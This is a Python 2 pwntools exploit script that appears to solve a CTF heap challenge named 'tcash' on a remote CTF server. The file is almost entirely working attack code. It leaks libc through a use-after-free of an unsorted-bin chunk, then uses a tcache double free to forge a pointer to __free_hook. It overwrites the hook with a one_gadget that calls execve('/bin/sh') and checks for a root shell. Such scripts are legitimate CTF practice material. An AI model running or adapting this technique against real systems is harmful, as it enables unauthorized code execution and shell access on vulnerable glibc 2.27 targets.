#!/usr/bin/env python2

from pwn import *

context.log_level = 'debug'
context.update(arch='amd64', os='linux')

b = ELF('./tcash')
l = ELF('./libc-2.27.so')

r = remote("tcash.ctf.cuctf.io", 9700)

def quit(reason):
    r.sendline("Quit")
    r.sendlineafter("Please state your reason for quitting: ", reason)

def display(index):
    r.sendline("Display Entry")
    r.sendlineafter("Index: ", str(index))

def edit_amnt(index, amnt):
    r.sendline("Edit Amount")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Amount: ", str(amnt))

def edit_desc(index, desc):
    r.sendline("Edit Description")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Description: ", str(desc))

def edit_addr(index, addr):
    r.sendline("Edit Address")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Address: ", str(addr))

def delete(index):
    r.sendline("Delete Entry")
    r.sendlineafter("Index: ", str(index))

def create(index, addr_size, desc_size, amnt_size):
    r.sendline("Create Entry")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Address size: ", str(addr_size))
    r.sendlineafter("Description size: ", str(desc_size))
    r.sendlineafter("Amount size: ", str(amnt_size))

# Unsorted UAF to leak libc
create(0, 0x500, 0x500, 0x500)
delete(0)
display(0)

addr = r.recvline()
desc = r.recvline()
amnt = r.recvline()

libc = u64(addr[len("Address: "):-1].ljust(8, '\x00'))

'''
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
'''

l.address = libc - 0x3EBCA0
onegadget = l.address + 0x4f322
free_hook = l.symbols['__free_hook']

log.info('Libc Base: ' + hex(l.address))
log.info('OneGadget: ' + hex(onegadget))
log.info('Free Hook: ' + hex(free_hook))

# Tcache dup
create(1,
0x8,            # x = malloc(8);
0x0,            # NOP
0x0)            # NOP
delete(1)       # free(x);
delete(1)       # free(x);

# Forge fd to __free_hook
create(2,
0x0,            # NOP
0x0,            # NOP
0x8)            # y = malloc(8);
edit_amnt(2,
p64(free_hook)) # *y = __free_hook;

# Overwrite __free_hook with One Gadget
create(3,
0x0,            # NOP
0x8,            # z = malloc(8);
0x8)            # t = malloc(8);
edit_amnt(3,
p64(onegadget)) # *t = one_gadget;

# Call __free_hook
delete(1)

r.sendline("id")
try:
    res = r.recvline()
    if "uid=0(root)" not in res:
        log.failure("Exploit failed")
    else: log.success("Exploit succeeded")
except EOFError:
    log.failure("Exploit failed")

r.sendline("id")
try:
    res = r.recvline()
    if "uid=0(root)" not in res:
        log.failure("Exploit failed")
    else: log.success("Exploit succeeded")
except EOFError:
    log.failure("Exploit failed")
